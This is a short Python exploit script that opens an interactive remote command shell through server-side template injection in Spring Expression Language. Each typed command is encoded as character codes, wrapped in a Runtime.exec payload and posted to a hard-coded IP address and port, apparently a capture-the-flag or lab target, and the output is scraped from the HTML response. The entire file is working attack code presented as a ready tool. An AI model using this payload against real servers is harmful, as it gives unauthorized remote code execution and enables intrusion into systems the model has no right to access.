#!/usr/bin/python3
import requests
from cmd import Cmd
from bs4 import BeautifulSoup

class RCE(Cmd):
    prompt = "\033[1;31m$\033[1;37m "
    def decimal(self, args):
        comando = args
        decimales = []

        for i in comando:
            decimales.append(str(ord(i)))
        payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)" % decimales[0]

        for i in decimales[1:]:
            payload += ".concat(T(java.lang.Character).toString({}))".format(i)

        payload += ").getInputStream())}"
        data = { "name": payload }
        requer = requests.post("http://167.99.86.249:30711/", data=data)
        parser = BeautifulSoup(requer.content, 'html.parser')
        grepcm = parser.find_all("h2")[0].get_text()
        result = grepcm.replace('You searched for:','').strip()
        print(result)

    def default(self, args):
        try:
            self.decimal(args)
        except:
            print("%s: command not found" % (args))

RCE().cmdloop()

#Can be used for SSTI attacks
